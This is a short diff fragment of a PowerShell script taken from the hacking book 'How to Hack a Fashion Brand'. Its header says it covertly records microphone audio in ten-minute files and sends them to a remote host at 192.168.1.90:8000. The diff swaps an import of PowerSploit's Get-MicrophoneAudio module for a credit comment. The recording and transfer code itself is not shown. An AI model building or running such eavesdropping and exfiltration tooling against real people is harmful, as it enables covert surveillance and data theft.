@@ -2,7 +2,7 @@
 # Creates 10 minute long audio files and sends them to a remote location (192.168.1.90:8000 in this example)
 #
 # @uthor : Sparc Flow in "How to Hack a Fashion Brand"
-import-module .\Get-MicrophoneAudio.ps1 -force
+# Credit Get-MicrophoneAudio by @sixdub of the PowerSploit framework
 while($i -le 2)
 {
 
